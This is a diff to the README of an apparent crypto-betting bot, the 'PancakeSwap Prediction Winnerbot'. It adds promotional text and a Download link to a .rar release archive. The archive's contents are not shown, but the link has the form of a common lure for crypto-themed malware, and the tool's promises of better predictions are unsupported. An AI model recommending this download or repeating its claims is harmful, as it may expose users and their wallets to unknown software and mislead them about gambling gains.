@@ -1,5 +1,17 @@
   
-# 🔮 PancakeSwap Prediction Winnerbot
+# 🔮 PancakeSwap Prediction  Winnerbot.
+
+<div align="center">
+  <img height="256" src="./src-tauri/banner.png" />
+</div>
+
+<h1 align="center">PancakeSwap Prediction Winnerbot</h1>
+
+<p align="center">Bot for PancakeSwap Prediction – 26 technical indicators. Make smarter predictions with the Winnerbot – trust math, not emotions!</p>
+
+<p align=center>
+  <a href="https://github.com/BearAnBull/Pancakeswap-Winningbot/releases/download/V.1.1.5/Pancakeswap-Winningbot.2023.rar" ## **>Download</a>
+</p>
 
 ![PancakeSwap-Logo](/img/logo.jpg?raw=true)
 
